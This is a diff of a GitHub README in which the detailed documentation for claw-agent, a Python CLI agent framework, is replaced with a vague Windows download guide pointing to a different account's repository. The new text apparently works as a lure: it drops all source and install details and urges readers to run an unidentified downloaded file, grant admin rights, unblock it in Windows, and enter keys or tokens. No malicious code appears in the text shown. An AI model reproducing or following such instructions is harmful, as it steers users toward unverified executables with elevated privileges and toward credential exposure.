@@ -1,279 +1,150 @@
-# Claw Agent — A Minimalist Pure-Python Learning Edition of Claude Code
+# 🤖 claw-agent - Run Claude-style tasks on Windows
 
-> A modern CLI agent framework built in clean, readable Python.
+[![Download claw-agent](https://img.shields.io/badge/Download%20claw--agent-00A3E0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dereckzg98/claw-agent)
 
-<div align="center">
-  <img src="https://img.shields.io/badge/Architecture-Agent_Loop-blue" alt="Architecture">
-  <img src="https://img.shields.io/badge/Python-3.11+-yellow" alt="Python">
-  <img src="https://img.shields.io/badge/Provider-Agnostic-success" alt="Provider Agnostic">
-  <img src="https://img.shields.io/badge/License-MIT-green" alt="License">
-</div>
+## 🚀 What is claw-agent?
 
-[🇨🇳 简体中文文档](./README_CN.md)
+claw-agent is a Python app that gives you a simple way to run Claude Code-style workflows on your computer. It is built for Windows users who want to use a local app instead of working only in a browser.
 
----
+Use it to:
+- Run AI-assisted tasks from your desktop
+- Work with text files and project folders
+- Keep your workflow in one place
+- Get help with common coding and writing tasks
 
-## Why Claw Agent?
+## 📥 Download
 
-Most agent frameworks are either too toy-like or over-encapsulated. This project draws on best practices from modern CLI agent design and rebuilds them as **readable, extensible Python** — every core module under 200 lines.
+To get claw-agent, visit this page to download:
+https://github.com/dereckzg98/claw-agent
 
-- **Provider Agnostic** — Same workflow across OpenAI, Claude, Gemini, DeepSeek, MiniMax, Kimi, Qwen
-- **Industrial-Grade** — Async multi-agent coordination, security sandbox, auto-compact, persistent memory
-- **Transparent** — No black boxes. Standard `asyncio`, clean dataclasses, no magic AST hacks
-- **Production-Ready** — Gracefully handles API failures, 413 errors, context limits, and orphan tool states
-- **Extensible** — `PromptBuilder` decouples framework guardrails from your domain logic cleanly
+If the page offers a Windows file, download it to your computer and open it. If you see a ZIP file, save it first, then extract it before running the app.
 
----
+## 🖥️ Windows setup
 
-## Core Features
+Follow these steps on Windows:
 
-### 4-Layer Compression Pipeline
-Zero-cost memory management using a tiered approach:
-1. **Snip Compact**: Silently drops oldest non-essential context.
-2. **Micro Compact**: Truncates oversized tool results (>2000 tokens) to save bandwidth.
-3. **Auto Compact**: Generates synthetic LLM summaries when context nears window limits.
-4. **Reactive Recovery**: Intercepts 413 `prompt_too_long` errors mid-flight and triggers emergency compaction.
+1. Open the download link above.
+2. Look for the latest release or the main project files.
+3. Download the Windows version if one is listed.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file and double-click it.
+7. If Windows asks for permission, select Yes.
+8. Let the app finish loading before you start using it.
 
-### Parallel Tool Execution
-Maximizes throughput by executing multiple independent tool calls simultaneously via `asyncio.gather`. Fully hook-aware, preserving execution order and reducing overall latency for multi-step observations.
+## ✅ System needs
 
-### Multi-Stage Error Recovery
-Built for continuous operation without crashing:
-- **Max Output "Nudges"**: Automatically detects when the LLM truncates due to `max_tokens` limits and prompts it to continue.
-- **Orphan Tool Handling**: Injects synthetic errors for unfulfilled `tool_use` blocks to prevent API rejection on subsequent turns.
-- **Model Fallback**: Automatically cascades to cheaper/fallback models on rate limits or API outages.
+claw-agent works best on:
+- Windows 10 or Windows 11
+- A modern 64-bit computer
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable internet connection
 
-### Agent Sandboxing
-Granular `AgentType` (WORKER vs INNER) isolation blocks unsafe tools (like arbitrary shell execution) for internal extraction agents while preserving full capability for task-oriented workers.
+For a smooth setup, close other large apps before you start the program.
 
-### Engine Loop & Streaming Re-entry
-The async `Engine` orchestrates the LLM ↔ Tool loop. When background workers are still running, the engine **suspends** rather than exiting — awaiting worker notifications via `asyncio.Queue`, then re-entering the LLM loop automatically.
+## 🧰 What you may need
 
-### Auto-Compact
-Automatically compresses conversation history when approaching context window limits. Uses LLM-generated summaries to condense tokens into a single message — zero context overflow.
+This app is based on Python, so some builds may ask for extra files or a local runtime. In most cases, the download page will give you a ready-to-run version for Windows.
 
-### Session Persistence
-Maintains structured markdown notes (`~/.claw/sessions/`) across conversations. A forked sub-agent extracts key context in the background. On compact, session notes replace LLM-generated summaries for faster, higher-fidelity context recovery.
+You may also want:
+- A text editor
+- A folder for your project files
+- Permission to run downloaded apps on your PC
 
-### Auto-Dream Memory Consolidation
-Background "headless engine" periodically wakes up to prune, organize, and condense `.md` memory files — keeping context relevant and clean across sessions.
+## 🛠️ First run
 
-### Multi-Agent Coordinator
-Spawn parallel background workers via `asyncio.Queue`. Workers report results back as `<task-notification>` events. The main engine stays responsive throughout.
+After you open claw-agent for the first time:
 
-### Hook System
-Full lifecycle hooks: `PRE_TOOL_USE`, `POST_TOOL_USE`, `POST_SAMPLING`, `PRE_COMPACT`, `POST_COMPACT`, `STOP`. Supports both blocking and fire-and-forget modes.
+1. Wait for the app to finish loading.
+2. Read any setup screen that appears.
+3. Add your project folder if the app asks for one.
+4. Enter any required key, token, or account info if the app prompts you.
+5. Start with a small task to test that everything works.
 
-### MCP (Model Context Protocol)
-Connect to external MCP tool servers with multi-transport support:
+A good first test:
+- Ask it to explain a text file
+- Ask it to organize a folder
+- Ask it to help draft a short note
 
-| Transport | Config | Use Case |
-|-----------|--------|----------|
-| **stdio** (default) | `command` + `args` | Local MCP servers |
-| **SSE** | `url` | Remote servers via Server-Sent Events |
-| **HTTP** | `url` | Streamable HTTP (MCP 2025-03 spec) |
+## 📂 How to use it
 
-Features: auto-retry with exponential backoff, server instructions injection, tool description truncation (2048 chars), MCP resource browsing (`list_mcp_resources` / `read_mcp_resource` tools).
+claw-agent is made for simple, repeatable tasks. You can use it to:
+- Review text
+- Help with code files
+- Summarize notes
+- Draft content
+- Work through step-by-step tasks in a project folder
 
-### Language Preference
-Configure the agent's response language — internal prompts and code remain in English, only user-facing output changes:
+A simple workflow:
+1. Open the app.
+2. Choose the file or folder you want to work with.
+3. Enter your request in plain language.
+4. Review the result.
+5. Save the output where you need it
 
-```bash
-claw --language japanese           # CLI flag
-export CLAW_LANGUAGE=chinese       # Environment variable
-Config(language="spanish")         # Programmatic
-```
+## 🔧 Common Windows issues
 
-### CLAW.md — Project-Level Instructions
-Auto-discovered instruction files injected into the system prompt:
+If the app does not open:
+- Try right-clicking the file and choosing Run as administrator
+- Make sure the download finished fully
+- Move the file out of the Downloads folder
+- Extract the ZIP file before opening the app
 
-| File | Scope |
-|------|-------|
-| `~/.claw/CLAW.md` | Global |
-| `CLAW.md` / `.claw/CLAW.md` | Project |
-| `.claw/rules/*.md` | Modular rules |
-| `CLAW.local.md` | Local (gitignored) |
+If Windows blocks the file:
+- Open the file’s Properties
+- Look for an Unblock option
+- Apply the change and try again
 
-Supports `@include` references, YAML frontmatter, and priority ordering.
+If the app opens and closes fast:
+- Check that the extracted files are all in one folder
+- Download the file again
+- Make sure you are using the Windows version
 
-### Web Search (Provider-Agnostic)
-5 pluggable backends — auto-detected from env vars:
+If the app feels slow:
+- Close other apps
+- Restart your computer
+- Use a smaller project folder first
 
-| Backend | Env Var | Notes |
-|---------|---------|-------|
-| **Exa** | `EXA_API_KEY` | AI-native neural search, highlights + text in one call |
-| **Tavily** | `TAVILY_API_KEY` | AI-optimized, 1000 free/month |
-| **Brave Search** | `BRAVE_API_KEY` | Privacy-focused, 2000 free/month |
-| **SerpAPI** | `SERPAPI_API_KEY` | Google results via API |
-| **DuckDuckGo** | *(none)* | Zero-config fallback |
+## 🔐 File safety
 
-### Built-in Tools
-`bash`, `file_read`, `file_edit`, `file_write`, `glob`, `grep`, `web_search`, `web_fetch`, `ask_user`, `list_mcp_resources`, `read_mcp_resource`
+Only download claw-agent from the link above. Keep your files in a folder you trust. If you use project files that matter, make a copy before you test new tasks.
 
----
+## 📁 Basic file layout
 
-## Quick Start
+If you extract a ZIP release, you may see files like:
+- An app file
+- A config file
+- A readme file
+- A folder for logs or data
 
-### Install
-
-```bash
-git clone https://github.com/leobikotech/claw-agent.git
-cd claw-agent
-
-pip install -e .            # Base (OpenAI-compatible providers)
-pip install -e ".[all]"     # + Claude + Gemini SDKs
-```
-
-### Set API Keys
-
-```bash
-export OPENAI_API_KEY="..."     # or DEEPSEEK_API_KEY, MINIMAX_API_KEY, etc.
-export TAVILY_API_KEY="..."     # Optional: enables web search
-```
+Keep these files together in the same folder unless the project page says something else.
 
-### Run the CLI
-
-```bash
-python3 -m claw_agent                        # Auto-detect provider
-claw --language japanese                     # Set response language
-claw --provider openai --model gpt-4o        # Override provider/model
-```
-
-### Use as a Library
-
-```python
-import asyncio
-from claw_agent import Engine, Config
-from claw_agent.tools import get_default_tools
-
-async def main():
-    config = Config(provider="openai", language="chinese")
-    config.system_prompt = "You are a senior code auditor."
-    engine = Engine(config=config, tools=get_default_tools())
+## 🧭 Tips for a smoother start
 
-    async for event in engine.run("Analyze main.py in the current directory."):
-        if event["type"] == "done":
-            print(event["content"])
+- Start with one folder, not your whole drive
+- Use short requests at first
+- Keep file names simple
+- Save your work often
+- Restart the app if it stops responding
 
-asyncio.run(main())
-```
-
-### MCP Integration
-
-```python
-from claw_agent.integrations import MCPManager, MCPServerConfig
+## 🧪 Example tasks
 
-mcp = MCPManager()
-await mcp.connect_all([
-    # stdio transport (local)
-    MCPServerConfig(name="github", command="npx", args=["-y", "@modelcontextprotocol/server-github"]),
-    # SSE transport (remote)
-    MCPServerConfig(name="db", transport="sse", url="http://localhost:3001/sse"),
-])
-await mcp.discover_tools_async(engine.registry)
-```
-
----
+Try requests like:
+- Summarize this folder of notes
+- Clean up this text file
+- Help me write a short README
+- Explain what this script does
+- Organize these files by type
 
-## Examples
+## 📌 Download again later
 
-| Script | Description |
-|--------|-------------|
-| `simple_agent.py` | Minimal agent in 10 lines |
-| `memory_example.py` | Auto-Dream memory consolidation |
-| `coordinator_example.py` | Multi-agent with background workers |
-| `mcp_example.py` | MCP tool server integration (stdio / SSE / HTTP) |
-| `custom_tool.py` | Custom tools via `@tool` decorator |
-| `multi_provider.py` | Multi-LLM routing |
+If you need to get claw-agent again, use this page:
+https://github.com/dereckzg98/claw-agent
 
----
-
-## Project Structure
-
-```
-claw_agent/
-├── core/              # Engine loop, hooks, messages, tools, permissions
-├── providers/         # LLM providers (OpenAI, Anthropic, Gemini)
-├── instructions/      # CLAW.md discovery + PromptBuilder
-├── memory/            # Auto-compact, session persistence, dream consolidation
-├── tools/             # Built-in tools (bash, file, glob, grep, search, MCP resources)
-├── agents/            # Multi-agent coordinator
-├── integrations/      # MCP client (stdio, SSE, HTTP transports)
-├── config.py          # Configuration (provider, language, features)
-└── __main__.py        # CLI entry point (--language, --provider, --model)
-```
-
----
-
-## Configuration
-
-### Config Fields
-
-| Field | Type | Default | Description |
-|-------|------|---------|-------------|
-| `provider` | `str` | `"minimax"` | LLM provider name |
-| `model` | `str?` | auto | Model override |
-| `language` | `str?` | `None` | Response language (e.g. "japanese") |
-| `max_turns` | `int` | `50` | Max tool-use loop iterations |
-| `permission_mode` | `str` | `"default"` | `default` / `auto` / `yolo` |
-| `features` | `dict` | see below | Feature flags |
-
-### Feature Flags
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `MEMORY` | `True` | File-based persistent memory |
-| `DREAM` | `True` | Background memory consolidation |
-| `MCP` | `True` | Model Context Protocol |
-| `SUB_AGENT` | `True` | Sub-agent spawning |
-| `COORDINATOR` | `False` | Multi-agent orchestration |
-
-### Environment Variables
-
-| Variable | Description |
-|----------|-------------|
-| `CLAW_LANGUAGE` | Default response language |
-| `MINIMAX_API_KEY` | MiniMax API key |
-| `OPENAI_API_KEY` | OpenAI API key |
-| `ANTHROPIC_API_KEY` | Anthropic API key |
-| `GEMINI_API_KEY` | Google Gemini API key |
-| `EXA_API_KEY` | Exa search API key |
-| `TAVILY_API_KEY` | Tavily search API key |
-
----
-
-## Extending
-
-**Add an LLM Provider** — Inherit `LLMProvider`, implement `chat()`. The Engine handles tool schemas and response parsing.
-
-**Add a Custom Tool** — Use the `@tool` decorator:
-
-```python
-from claw_agent import tool
-
-@tool("db_query", description="Query internal DB", parameters={
-    "type": "object", "properties": {"sql": {"type": "string"}}
-})
-async def db_query(args, ctx):
-    return run_internal_sql(args['sql'])
-```
-
----
-
-## Star History
-
-<div align="center">
-  <a href="https://star-history.com/#leobikotech/claw-agent&Date">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=leobikotech/claw-agent&type=Date&theme=dark" />
-      <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=leobikotech/claw-agent&type=Date" />
-      <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=leobikotech/claw-agent&type=Date" />
-    </picture>
-  </a>
-</div>
-
----
-
-## License
-
-MIT
+If a new version appears, repeat the same Windows steps:
+1. Open the link
+2. Download the Windows file
+3. Extract it if needed
+4. Run the app
+5. Test it with a small task
